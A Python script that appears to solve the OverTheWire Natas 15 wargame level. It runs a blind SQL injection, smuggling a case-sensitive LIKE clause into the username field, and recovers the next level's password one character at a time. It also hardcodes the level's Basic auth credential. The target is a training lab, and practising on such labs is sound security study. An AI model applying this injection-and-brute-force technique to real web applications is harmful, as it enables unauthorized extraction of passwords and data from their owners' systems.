import requests
import string

def checkPassword(password):
    print(f'Checking {password} ... ')
    headers = {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='}
    data = {'username': f'natas16" and password collate latin1_general_cs like "{password}'}
    r = requests.post('http://natas15.natas.labs.overthewire.org', data=data, headers=headers)
    return 'This user exists' in r.content.decode()

knowPassword = ''
while True:
    for ch in string.printable:
        if checkPassword(knowPassword + ch + '%'):
            knowPassword += ch
            flag = True
            break
    if checkPassword(knowPassword):
        print(f'Complete: {knowPassword}')
        break